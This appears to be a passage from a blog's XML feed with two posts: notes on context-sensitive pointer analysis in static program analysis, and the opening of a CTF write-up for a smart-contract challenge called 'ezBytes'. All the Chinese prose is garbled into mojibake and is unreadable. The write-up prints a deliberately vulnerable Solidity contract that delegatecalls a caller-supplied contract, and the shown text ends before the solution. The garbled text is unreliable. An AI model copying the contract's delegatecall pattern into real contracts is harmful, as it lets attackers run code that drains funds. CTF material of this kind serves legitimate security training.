ï¼ˆè°ƒç”¨æ–¹æ³•çš„å¯¹è±¡ï¼‰</p><ul><li><p>è™šçº¿ï¼Œä½†æ˜¯xåˆ°thisæŒ‡é’ˆä¸æ˜¯ç›´æ¥å»ºç«‹pfgä¸­çš„è¾¹</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222339692.png"                      alt="image-20231031101710618" style="zoom:33%;"                 ><figcaption>image-20231031101710618</figcaption></figure></li><li><p>å› ä¸ºxå¯èƒ½æŒ‡å‘å¤šä¸ªå¯¹è±¡ï¼Œä¸‹å›¾è¿™ç§æƒ…å†µï¼Œå¦‚æœç›´æ¥å»ºç«‹x-&gt;this,ä¼šå¯¼è‡´ä¸‰ä¸ªç±»çš„thiséƒ½æŒ‡å‘ABCï¼ˆæ˜æ˜¾å„ç±»ä¸­é€šè¿‡dispatchæ‰¾fooæ–¹æ³•æ—¶ï¼Œthisåªä¼šæ˜¯æœ¬èº«ï¼‰</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222339402.png"                      alt="image-20231031102313325"                ><figcaption>image-20231031102313325</figcaption></figure></p></li><li><p>è§£å†³æ–¹æ³•ï¼šç‰¹æ®Šå¤„ç†ï¼Œåªä¼ è¯¥ä¼ çš„</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222339227.png"                      alt="image-20231031102959408"                ><figcaption>image-20231031102959408</figcaption></figure></p></li></ul></li><li><p>ä¼ å‚æ•°</p><ul><li>mæ˜¯å½¢å‚ï¼Œaæ˜¯å®å‚</li><li>æŠŠå®å‚å’Œå½¢å‚è¿èµ·æ¥(PFGä¸­)</li></ul></li><li><p>ä¼ è¿”å›å€¼</p><ul><li>å‡½æ•°ä¸­çš„retä¼ åˆ°å¤–é¢çš„rå˜é‡ä¸­</li></ul></li></ol><h3 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h3><p>åˆ†æå¯è¾¾æ–¹æ³•</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222339317.png"                      alt="image-20231031103610480"                ><figcaption>image-20231031103610480</figcaption></figure></p><blockquote><p>è¾“å…¥ä¸ºç¨‹åºçš„entryæ–¹æ³•ï¼Œå¯ä»¥ç†è§£ä¸ºmainæ–¹æ³•</p><p>Sä¸ºå¯è¾¾è¯­å¥çš„é›†åˆ</p><p>RMä¸ºå¯è¾¾æ–¹æ³•é›†åˆ</p><p>CG call graphçš„è¾¹</p></blockquote><h3 id="algorithmâ€“AddReachable"><a href="#algorithmâ€“AddReachable" class="headerlink" title="algorithmâ€“AddReachable"></a>algorithmâ€“AddReachable</h3><ol><li>é¦–å…ˆæŠŠä¼ å…¥çš„æ–¹æ³•måŠ å…¥RMé›†åˆï¼ˆå…ˆåˆ¤æ–­måœ¨ä¸åœ¨RMä¸­ï¼‰ï¼Œmæ‰€åœ¨è¯­å¥Smä¹ŸåŠ å…¥Sé›†åˆä¸­</li><li>å¤„ç†newè¯­å¥ï¼ŒåŠ å…¥WL</li><li>å¤„ç†assignè¯­å¥ï¼Œè°ƒç”¨addEdge</li></ol><blockquote><p>å› ä¸ºæ–¹æ³•æ˜¯æ–°åŠ è¿›æ¥çš„ï¼ŒæŒ‡é’ˆé›†éƒ½æ˜¯ç©ºçš„ï¼Œè¿˜æ²¡åŠæ³•åšloadå’Œstore ï¼ˆåœ¨åé¢çš„å¤§å¾ªç¯ä¸­ä¼šè¢«å¤„ç†ï¼‰</p></blockquote><h3 id="algorithmâ€“ProcessCall"><a href="#algorithmâ€“ProcessCall" class="headerlink" title="algorithmâ€“ProcessCall"></a>algorithmâ€“ProcessCall</h3><p>ä¼ å…¥å‚æ•°ä¸ºxå’Œoi</p><p>å¤„ç†æ¯æ¡æ–¹æ³•è°ƒç”¨è¯­å¥ l: r&#x3D;x.k(a1,â€¦,an)</p><ol><li>é€šè¿‡dispatchå®šä½åˆ°çœŸæ­£çš„æ–¹æ³•m</li><li>&lt;m_this,{oi}&gt;åŠ åˆ°WL</li><li>å¦‚æœl-&gt;mä¸åœ¨call graphä¸­ï¼Œåˆ™åŠ å…¥<ul><li>ä¹‹åç»§ç»­å¤„ç†å‚æ•°ï¼Œå®å‚æŒ‡å‘å½¢å‚</li><li>ä¼ è¿”å›å€¼</li></ul></li></ol><h2 id="ä¸Šä¸‹æ–‡æ•æ„ŸæŒ‡é’ˆåˆ†æ"><a href="#ä¸Šä¸‹æ–‡æ•æ„ŸæŒ‡é’ˆåˆ†æ" class="headerlink" title="ä¸Šä¸‹æ–‡æ•æ„ŸæŒ‡é’ˆåˆ†æ"></a>ä¸Šä¸‹æ–‡æ•æ„ŸæŒ‡é’ˆåˆ†æ</h2><h3 id="motivation"><a href="#motivation" class="headerlink" title="motivation"></a>motivation</h3><p>ä½¿ç”¨ä¸Šä¸‹æ–‡ä¸æ•æ„ŸæŒ‡é’ˆåˆ†æï¼Œåˆ†æå‡ºæ¥iæ—¶1</p><p>æ ¹æ®å¸¸é‡ä¼ æ’­ï¼Œåˆ†æå‡ºæ¥æ˜¯NAC</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222339039.png"                      alt="image-20231031144945307"                ><figcaption>image-20231031144945307</figcaption></figure></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222340568.png"                      alt="image-20231031145340357"                ><figcaption>image-20231031145340357</figcaption></figure></p><p>ä¸Šä¸‹æ–‡æ•æ„Ÿï¼Œæ–¹æ³•è°ƒç”¨æ—¶åˆ†å¼€åˆ†æ</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222340741.png"                      alt="image-20231031145454890" style="zoom: 50%;"                 ><figcaption>image-20231031145454890</figcaption></figure><h3 id="å…‹éš†"><a href="#å…‹éš†" class="headerlink" title="å…‹éš†"></a>å…‹éš†</h3><p>ç»™æ¯ä¸ªæ–¹æ³•åŠ ä»¥ä¸Šä¸‹æ–‡ä¿®é¥°</p><p>ä»¥ä¸Šé¢çš„ç¨‹åºä¸ºä¾‹ï¼Œidæœ‰ä¸¤ä¸ªä¸Šä¸‹æ–‡ï¼Œç»™idå…‹éš†ä¸¤ä»½</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222340777.png"                      alt="image-20231031190623874" style="zoom:50%;"                 ><figcaption>image-20231031190623874</figcaption></figure><h3 id="ä¸Šä¸‹æ–‡æ•æ„Ÿçš„Heap"><a href="#ä¸Šä¸‹æ–‡æ•æ„Ÿçš„Heap" class="headerlink" title="ä¸Šä¸‹æ–‡æ•æ„Ÿçš„Heap"></a>ä¸Šä¸‹æ–‡æ•æ„Ÿçš„Heap</h3><p>ä¸Šä¸‹æ–‡æ•æ„Ÿè¿˜è¦åŠ åœ¨å †æŠ½è±¡ä¸­ï¼Œå¾—åˆ°æ›´ç»†ç²’åº¦çš„å †æŠ½è±¡</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222340035.png"                      alt="image-20231031190855453"                ><figcaption>image-20231031190855453</figcaption></figure></p><p>ä¸åŒä¸Šä¸‹æ–‡åˆ›å»ºçš„Xï¼Œé‡Œé¢çš„fieldä¸ä¸€å®šä¸€æ ·</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222340066.png"                      alt="image-20231031191041314" style="zoom:33%;"                 ><figcaption>image-20231031191041314</figcaption></figure><h3 id="Heapâ€“an-example"><a href="#Heapâ€“an-example" class="headerlink" title="Heapâ€“an example"></a>Heapâ€“an example</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>  n1 = <span class="keyword">new</span> <span class="title class_">One</span>();</span><br><span class="line"><span class="number">2</span>  n2 = <span class="keyword">new</span> <span class="title class_">Two</span>();</span><br><span class="line"><span class="number">3</span>  x1 = newX(n1);</span><br><span class="line"><span class="number">4</span>  x2 = newX(n2);</span><br><span class="line"><span class="number">5</span>  n = x1.f;<span class="comment">// nåŠ¨æ€æ‰§è¡Œæ—¶æŒ‡å‘n1</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">7</span> X <span class="title function_">newX</span><span class="params">(Number p)</span> &#123; </span><br><span class="line"><span class="number">8</span> Xx=newX();</span><br><span class="line"><span class="number">9</span> x.f=p;</span><br><span class="line"><span class="number">10</span> <span class="keyword">return</span> x;</span><br><span class="line"><span class="number">11</span> &#125;</span><br><span class="line"><span class="number">12</span> <span class="keyword">class</span> <span class="title class_">X</span> &#123;</span><br><span class="line"><span class="number">13</span>    Number f;</span><br><span class="line"><span class="number">14</span> &#125;</span><br></pre></td></tr></table></figure></div><h4 id="å¯¹ä¸Šé¢è¿™æ®µç¨‹åºåšæŒ‡é’ˆåˆ†æ-æ­¤æ—¶Heapä¸Šä¸‹æ–‡ä¸æ•æ„Ÿ"><a href="#å¯¹ä¸Šé¢è¿™æ®µç¨‹åºåšæŒ‡é’ˆåˆ†æ-æ­¤æ—¶Heapä¸Šä¸‹æ–‡ä¸æ•æ„Ÿ" class="headerlink" title="å¯¹ä¸Šé¢è¿™æ®µç¨‹åºåšæŒ‡é’ˆåˆ†æ,æ­¤æ—¶Heapä¸Šä¸‹æ–‡ä¸æ•æ„Ÿ"></a>å¯¹ä¸Šé¢è¿™æ®µç¨‹åºåšæŒ‡é’ˆåˆ†æ,æ­¤æ—¶Heapä¸Šä¸‹æ–‡ä¸æ•æ„Ÿ</h4><ol><li>å…ˆåˆ†æ1ã€2ï¼Œ heapä¸­<code>&lt;n1,o1&gt; &lt;n2,o2&gt;</code></li><li>å†åˆ†æ3ã€7, <code>&lt;3:p,o1&gt;</code></li><li>åˆ†æ8 <code>&lt;3:x,o8&gt;</code></li><li>9ã€10 <code>&lt;o8.f,o1&gt; &lt;x1,3:o8&gt;</code> &#96;</li><li>4ã€7ã€8 <code>&lt;4:p,o2&gt; &lt;4:x,o8&gt;</code> </li><li>9 <code>&lt;o8.f,&#123;o1,o2&#125;&gt;</code></li><li>5 <code>&lt;n,&#123;o1,o2&#125;&gt;</code></li></ol><h4 id="Heapä¸Šä¸‹æ–‡æ•æ„Ÿåˆ†æ"><a href="#Heapä¸Šä¸‹æ–‡æ•æ„Ÿåˆ†æ" class="headerlink" title="Heapä¸Šä¸‹æ–‡æ•æ„Ÿåˆ†æ"></a>Heapä¸Šä¸‹æ–‡æ•æ„Ÿåˆ†æ</h4><ol><li>1ã€2ã€3 <code>&lt;n1,o1&gt; &lt;n2,o2&gt; &lt;3:p,o1&gt;</code> </li><li>8 <code>&lt;3:x,3:o8&gt;</code></li><li>9ã€10 <code>&lt;3:o8.f,o1&gt; &lt;x1,3:o8&gt;</code>  </li><li>4ã€7ã€8 <code>&lt;4:p,o2&gt; &lt;4:x,4:o8&gt;</code> </li><li>9ã€10 <code>&lt;4:o8.f,o2&gt; &lt;x2:4:o8&gt;</code></li><li>5 <code>&lt;n,o1&gt;</code></li></ol><h4 id="å¯¹æ¯”"><a href="#å¯¹æ¯”" class="headerlink" title="å¯¹æ¯”"></a>å¯¹æ¯”</h4><p>æå‡äº†æŒ‡é’ˆåˆ†æçš„ç²¾åº¦</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222340621.png"                      alt="image-20231031193052049" style="zoom:50%;"                 ><figcaption>image-20231031193052049</figcaption></figure><h4 id="ä¸Šä¸‹æ–‡æ•æ„ŸHeapï¼Œå˜é‡ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿ"><a href="#ä¸Šä¸‹æ–‡æ•æ„ŸHeapï¼Œå˜é‡ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿ" class="headerlink" title="ä¸Šä¸‹æ–‡æ•æ„ŸHeapï¼Œå˜é‡ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿ"></a>ä¸Šä¸‹æ–‡æ•æ„ŸHeapï¼Œå˜é‡ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿ</h4><p>è¯´æ˜äºŒè€…ç¼ºä¸€ä¸å¯</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222340871.png"                      alt="image-20231031193242899" style="zoom:50%;"                 ><figcaption>image-20231031193242899</figcaption></figure><h3 id="ç›¸å…³ç¬¦å·"><a href="#ç›¸å…³ç¬¦å·" class="headerlink" title="ç›¸å…³ç¬¦å·"></a>ç›¸å…³ç¬¦å·</h3><p>ç”¨cã€câ€™ã€câ€™â€™è¡¨ç¤ºä¸åŒä¸Šä¸‹æ–‡</p><p>CSPointerä¸Šä¸‹æ–‡æ•æ„Ÿçš„æŒ‡é’ˆ</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222340782.png"                      alt="image-20231031193939250" style="zoom: 33%;"                 ><figcaption>image-20231031193939250</figcaption></figure><h3 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h3><ul><li><p>newè¯­å¥ i: x &#x3D; new T();  c:oi&lt;-c:x</p></li><li><p>assignè¯­å¥ x&#x3D;y  å·²çŸ¥ c:y-&gt; câ€™:oi åˆ™ c:x-&gt;câ€™:oi</p></li><li><p>store å·²çŸ¥x.f&#x3D;y  c:x.f-&gt;câ€™:oi y-&gt;câ€™â€™:oj åˆ™câ€™:oi.f-&gt;câ€™â€™:oj</p><ul><li>câ€™å’Œcâ€™â€™å¯èƒ½æ˜¯åŒä¸€ä¸ªï¼Œä¹Ÿå¯èƒ½ä¸æ˜¯åŒä¸€ä¸ªä¸Šä¸‹æ–‡</li></ul></li><li><p>load å·²çŸ¥y&#x3D;x.f c:x.f-&gt;câ€™:oi câ€™:oi.f-&gt;câ€™â€™:oj åˆ™c:y-&gt;câ€™â€™:oj </p></li><li><p>call  l: r &#x3D; x</p><ul><li><p>c:x-&gt;câ€™:oi </p></li><li><p>æ‰¾ç›®æ ‡æ–¹æ³•ï¼Œdispatchï¼Œç„¶åæ ¹æ®è°ƒç”¨ç‚¹çš„ä¿¡æ¯ç®—å‡ºæ¥ä¸€ä¸ªä¸Šä¸‹æ–‡c^t&#x3D;Select(c,l,câ€™:oi,m)</p><ul><li><p>ç›¸å½“äºå…‹éš†ï¼Œæ¯é‡åˆ°ä¸€ä¸ªæ–°çš„è°ƒç”¨ç‚¹ï¼Œå°±ä¼šæ–°å¢ä¸€ä¸ªcallee context</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202406222341305.png"                      alt="image-20231031201855315" style="zoom: 33%;"                 ><figcaption>image-20231031201855315</figcaption></figure></li></ul></li><li><p>å®å‚å’Œå½¢å‚çš„å¯¹åº”</p></li><li><p>ä¼ returnå€¼ï¼Œè¿”å›å€¼çš„ä¸Šä¸‹æ–‡æ˜¯ä¸Šé¢é€‰å‡ºæ¥çš„c^t</p></li></ul></li></ul><h3 id="å¸¦æœ‰ä¸Šä¸‹æ–‡ä¿¡æ¯çš„PFG"><a href="#å¸¦æœ‰ä¸Šä¸‹æ–‡ä¿¡æ¯çš„PFG" class="headerlink" title="å¸¦æœ‰ä¸Šä¸‹æ–‡ä¿¡æ¯çš„PFG"></a>å¸¦æœ‰ä¸Šä¸‹æ–‡ä¿¡æ¯çš„PFG</h3><p>node:CSPointer</p><p>edges:CSPointer x CSPoniter</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222341127.png"                      alt="image-20231031203607920"                ><figcaption>image-20231031203607920</figcaption></figure></p><h4 id="Call"><a href="#Call" class="headerlink" title="Call"></a>Call</h4><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222341973.png"                      alt="image-20231031203724602"                ><figcaption>image-20231031203724602</figcaption></figure></p><h3 id="ä¸Šä¸‹æ–‡æ•æ„ŸæŒ‡é’ˆåˆ†æç®—æ³•"><a href="#ä¸Šä¸‹æ–‡æ•æ„ŸæŒ‡é’ˆåˆ†æç®—æ³•" class="headerlink" title="ä¸Šä¸‹æ–‡æ•æ„ŸæŒ‡é’ˆåˆ†æç®—æ³•"></a>ä¸Šä¸‹æ–‡æ•æ„ŸæŒ‡é’ˆåˆ†æç®—æ³•</h3><p>ä¸»é¢˜æ¡†æ¶å’Œä¸Šä¸‹æ–‡ä¸æ•æ„ŸæŒ‡é’ˆåˆ†æç®—æ³•ä¸€è‡´</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202406222341369.png"                      alt="image-20231031212845276"                ><figcaption>image-20231031212845276</figcaption></figure></p><ul><li>é¦–å…ˆç»™å…¥å£å‡½æ•°çš„ä¸Šä¸‹æ–‡ä¸º[]</li><li>entryæ–¹æ³•åŠ å…¥å¯è¾¾æ–¹æ³•<ul><li>åŒæ—¶å¤„ç†newå’Œassignè¯­å¥ï¼Œæ›´æ–°WL</li></ul></li><li>å¤„ç†WL<ul><li>æ›´æ–°WLä¸­pairé‡ŒæŒ‡é’ˆå¯¹åº”çš„é›†åˆ</li><li>å¦‚æœæŒ‡é’ˆæ˜¯å˜é‡ï¼Œåˆ™ç»§ç»­å¤„ç†loadå’Œstore</li><li>é‡ç‚¹ï¼šProcessCallï¼Œå¤šäº†ä¸€ä¸ªselect</li></ul></li></ul><h3 id="ä¸Šä¸‹æ–‡æ•æ„ŸæŠ€æœ¯"><a href="#ä¸Šä¸‹æ–‡æ•æ„ŸæŠ€æœ¯" class="headerlink" title="ä¸Šä¸‹æ–‡æ•æ„ŸæŠ€æœ¯"></a>ä¸Šä¸‹æ–‡æ•æ„ŸæŠ€æœ¯</h3><ul><li>è°ƒç”¨æ•æ„Ÿ k-CFA</li><li>ç±»å‹æ•æ„Ÿ</li><li>å¯¹è±¡æ•æ„Ÿ</li></ul>]]></content>
      
      
      <categories>
          
          <category> program analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> static analysis </tag>
            
            <tag> pointer analysis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ezBytes-å‡ºé¢˜è®°å½•/wp</title>
      <link href="/2023/10/02/ezBytes-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95-wp/"/>
      <url>/2023/10/02/ezBytes-%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95-wp/</url>
      
        <content type="html"><![CDATA[<h1 id="ezBytes"><a href="#ezBytes" class="headerlink" title="ezBytes"></a>ezBytes</h1><h2 id="0x00-åºè¨€"><a href="#0x00-åºè¨€" class="headerlink" title="0x00 åºè¨€"></a>0x00 åºè¨€</h2><p>æ ¡èµ›å‡ºçš„ä¸€é“æ™ºèƒ½åˆçº¦çš„wpï¼Œè®°å½•ä¸€ä¸‹</p><h2 id="0x01-ç¯å¢ƒåŸºæœ¬é…ç½®"><a href="#0x01-ç¯å¢ƒåŸºæœ¬é…ç½®" class="headerlink" title="0x01 ç¯å¢ƒåŸºæœ¬é…ç½®"></a>0x01 ç¯å¢ƒåŸºæœ¬é…ç½®</h2><h3 id="é’±åŒ…è¿æ¥ç§é“¾"><a href="#é’±åŒ…è¿æ¥ç§é“¾" class="headerlink" title="é’±åŒ…è¿æ¥ç§é“¾"></a>é’±åŒ…è¿æ¥ç§é“¾</h3><p>é¦–å…ˆéœ€è¦å‡†å¤‡ä¸€ä¸ªmetamask(ä¸€ä¸ªé’±åŒ…è½¯ä»¶ï¼Œæµè§ˆå™¨æ’ä»¶)ï¼Œéšæ„æ³¨å†Œä¸€ä¸ªè´¦å·å³å¯ï¼ˆç½‘ä¸Šæ•™ç¨‹å¾ˆå¤šï¼Œè¿™é‡Œä¸èµ˜è¿°ï¼Œå¯ä»¥å‚è€ƒ<a class="link"   href="https://www.bilibili.com/video/BV1Ca411n7ta?p=7&vd_source=5ec02b685bc73487523c9c6794fde5c4" >https://www.bilibili.com/video/BV1Ca411n7ta?p=7&amp;vd_source=5ec02b685bc73487523c9c6794fde5c4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> p7ï¼‰</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202311290242540.png"                      alt="image-20231128202757837" style="zoom:50%;"                 ><figcaption>image-20231128202757837</figcaption></figure><p>æ–°å»ºç½‘ç»œï¼ŒåŠ å…¥é¢˜ç›®çš„rpc(ç§é“¾),chain IDä¼šè‡ªåŠ¨è¯†åˆ«(å›¾ä¸­æŠ¥é”™é«˜é€Ÿchain idæ˜¯23896ï¼Œæ›´æ”¹å³å¯)ï¼Œè´§å¸ç¬¦å·å¡«å†™ETH</p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202311290242433.png"                      alt="image-20231128203720784" style="zoom:33%;"                 ><figcaption>image-20231128203720784</figcaption></figure><h3 id="æŸ¥çœ‹ç§é’¥"><a href="#æŸ¥çœ‹ç§é’¥" class="headerlink" title="æŸ¥çœ‹ç§é’¥"></a>æŸ¥çœ‹ç§é’¥</h3><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202311290242383.png"                      alt="image-20231128205729043" style="zoom:33%;"                 ><figcaption>image-20231128205729043</figcaption></figure><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="../images/202311290241553.png"                      alt="image-20231128205751032" style="zoom:33%;"                 ><figcaption>image-20231128205751032</figcaption></figure><p>ä¹‹åè¾“å…¥å¯†ç å³å¯è·å–è´¦æˆ·çš„ç§é’¥</p><h3 id="faucet-æ°´é¾™å¤´-è·å–æµ‹è¯•å¸"><a href="#faucet-æ°´é¾™å¤´-è·å–æµ‹è¯•å¸" class="headerlink" title="faucet(æ°´é¾™å¤´)è·å–æµ‹è¯•å¸"></a>faucet(æ°´é¾™å¤´)è·å–æµ‹è¯•å¸</h3><p>åªéœ€è¦æŠŠå…¬é’¥è¾“å…¥å³å¯è·å–1ETHï¼ˆcd 1åˆ†é’Ÿï¼‰</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241777.png"                      alt="image-20231128205414832"                ><figcaption>image-20231128205414832</figcaption></figure></p><h3 id="é¢˜ç›®åˆçº¦éƒ¨ç½²"><a href="#é¢˜ç›®åˆçº¦éƒ¨ç½²" class="headerlink" title="é¢˜ç›®åˆçº¦éƒ¨ç½²"></a>é¢˜ç›®åˆçº¦éƒ¨ç½²</h3><p>é¦–å…ˆè®¿é—®é¢˜ç›®åˆ›å»ºä¸€ä¸ªdeployerè´¦æˆ·ï¼Œæ³¨æ„ï¼šåªèƒ½çŸ¥é“è¯¥ç”¨æˆ·çš„å…¬é’¥ï¼Œä¸çŸ¥é“ç§é’¥ï¼Œè€Œæœ€åéƒ¨ç½²solveråˆçº¦æ—¶éœ€è¦è´¦æˆ·çš„ç§é’¥ï¼Œå› æ­¤éœ€è¦ç”¨åˆ°ä¸Šé¢é‚£ä¸ªç”¨metamaské’±åŒ…è½¯ä»¶åˆ›å»ºçš„ç”¨æˆ·ã€‚</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241215.png"                      alt="image-20231128205847508"                ><figcaption>image-20231128205847508</figcaption></figure></p><blockquote><p>tokenä¹Ÿéœ€è¦ä¿å­˜ï¼Œé¢˜ç›®åé¢ä¼šç”¨æ¥éƒ¨ç½²é¢˜ç›®åˆçº¦ï¼ŒåŒæ—¶è¿™é‡Œæœ€åæç¤ºäº†éœ€è¦å‘deployerç”¨æˆ·è½¬1.002æµ‹è¯•å¸ä»¥éƒ¨ç½²åˆçº¦</p></blockquote><p>å…ˆç”¨æ°´é¾™å¤´å‘deployerç”¨æˆ·è½¬2ä¸ªæµ‹è¯•å¸ï¼ˆå¯ä»¥ç»™è‡ªå·±ç”¨metamaskåˆ›çš„å·ä¹Ÿè½¬2ä¸ªæµ‹è¯•å¸ï¼‰ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥é€‰æ‹©2è¿›è¡Œchallengeåˆçº¦çš„éƒ¨ç½²äº†</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202311290241306.png"                      alt="image-20231128210457365"                ><figcaption>image-20231128210457365</figcaption></figure></p><blockquote><p>å¯ä»¥çœ‹åˆ°æˆåŠŸéƒ¨ç½²äº†åˆçº¦ï¼Œåˆçº¦åœ°å€ä¸º0xee7Cc887214b782563D9E4D42A124684e20E15bd</p><p>é¢˜ç›®ä¹Ÿæç¤ºäº†éœ€è¦è®©isSloved()è¿”å›true</p></blockquote><h3 id="Remix-IDEåœ¨çº¿éƒ¨ç½²é¢˜ç›®åˆçº¦"><a href="#Remix-IDEåœ¨çº¿éƒ¨ç½²é¢˜ç›®åˆçº¦" class="headerlink" title="Remix IDEåœ¨çº¿éƒ¨ç½²é¢˜ç›®åˆçº¦"></a>Remix IDEåœ¨çº¿éƒ¨ç½²é¢˜ç›®åˆçº¦</h3><p>è®¿é—®é€‰é¡¹4å¯ä»¥è·å–åˆçº¦çš„æºç </p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.7.2;</span><br><span class="line">contract ezBytes&#123;</span><br><span class="line">    address public  i_owner;</span><br><span class="line">    bytes32 private  password=&quot;jnctf2023&quot;;</span><br><span class="line">    constructor() payable  public&#123;</span><br><span class="line">        i_owner = msg.sender;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    modifier onlyOwner &#123;</span><br><span class="line">        if(msg.sender != i_owner) &#123; require(false); &#125;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    function challenge(address _yourContractAdd) public payable&#123;</span><br><span class="line"></span><br><span class="line">        uint256 size;</span><br><span class="line">        bytes memory your_code;</span><br><span class="line"></span><br><span class="line">        assembly&#123;</span><br><span class="line">            size := extcodesize(_yourContractAdd)</span><br><span class="line">            your_code := mload(0x40)</span><br><span class="line">            mstore(0x40, add(your_code, and(add(add(size, 0x20), 0x1f), not(0x1f))))</span><br><span class="line">            mstore(your_code, size)</span><br><span class="line">            extcodecopy(_yourContractAdd, add(your_code, 0x20), 0, size)</span><br><span class="line">        &#125;</span><br><span class="line">        for(uint256 i = 0; i &lt; your_code.length; i++) &#123;</span><br><span class="line">            require(int(uint8(your_code[i])) != 0xff,&quot;Nop&quot;);</span><br><span class="line">            require(int(uint8(your_code[i])) != 0xf5,&quot;Nop&quot;);</span><br><span class="line">            require(int(uint8(your_code[i])) != 0x01,&quot;Nop&quot;);</span><br><span class="line">            require(int(uint8(your_code[i])) % 2 == 1 || int(uint8(your_code[i])) == 0 );</span><br><span class="line">        &#125;</span><br><span class="line">        (bool success, ) = _yourContractAdd.delegatecall(&quot;&quot;);</span><br><span class="line">        require(success,&quot;Delegatecall failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    function check() public view returns(bool)&#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function changePassword(bytes32 str)onlyOwner payable public&#123;</span><br><span class="line">        password=str;</span><br><span class="line">    &#125;</span><br><span class="line">    function checkPassword() public view returns (bool)&#123;</span><br><span class="line">        return password==&quot;22222222222222&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        bool flag1=check();</span><br><span class="line">        require(flag1,&quot;Oops, there is still a balance in the contract account.&quot;);</span><br><span class="line">        bool flag2=checkPassword();</span><br><span class="line">        require(flag2,&quot;Password is wrong.&quot;);</span><br><span class="line">        return flag1&amp;&amp;flag2 ;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æ‰“å¼€åœ¨çº¿IDE Remix <a class="link"   href="https://remix.ethereum.org/" >https://remix.ethereum.org/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 